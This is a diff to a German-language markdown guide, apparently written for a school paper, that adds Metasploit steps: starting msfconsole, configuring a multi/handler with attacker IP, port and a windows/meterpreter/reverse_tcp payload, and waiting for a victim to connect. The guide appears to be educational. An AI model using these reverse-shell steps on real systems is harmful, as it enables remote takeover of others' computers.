@@ -60,7 +60,33 @@ Anschließend können wir mit
 Unser Exploit-Tool starten. Das weitere Vorgehen steht in der Facharbeit. Die von uns genutzte Zahlenkombination lautete:
 * 6
 * 2
-* Dann nur noch die IP, Port Name und die Payload (windows/meterpreter/reverse_tcp)
+* Dann nur noch die IP des Angreifers, Port, Name und die Payload (windows/meterpreter/reverse_tcp)
+### Metasploit-Framework
+Um die Verbindung vom opfer zu zulassen, müssen wir noch metasploit starten mit dem Befehl
+```
+msfconsole
+```
+Nach einiger ladezeit können wir nun Metasploit benutzten. Zuerst wollen wir den Handler benutzten. Dafür geben wir
+```
+use multi/handler
+```
+ein. Anschließend setzten wir mit
+```
+set LHOST IP-ADDR
+```
+und
+```
+set LPORT PORTNR
+```
+Die IP und den Port. Hier wählen wie die gleiche IP und Port wie im vorherigen Schritt in der Genereierung des Exploits. Zum Schluss setzten wir noch die Payload mit
+```
+set payload windows/meterpreter/reverse_tcp
+```
+Zum Schluss warten wir bis das Opfer sich zu uns verbindet. Das machen wir mit
+```
+exploit
+```
+Jetzt muss der Exploit auf dem System des Opfer gestartet werden.
 
 ## Wichtige Kommandos
 * cd - in ein Verzeichnis wechslen
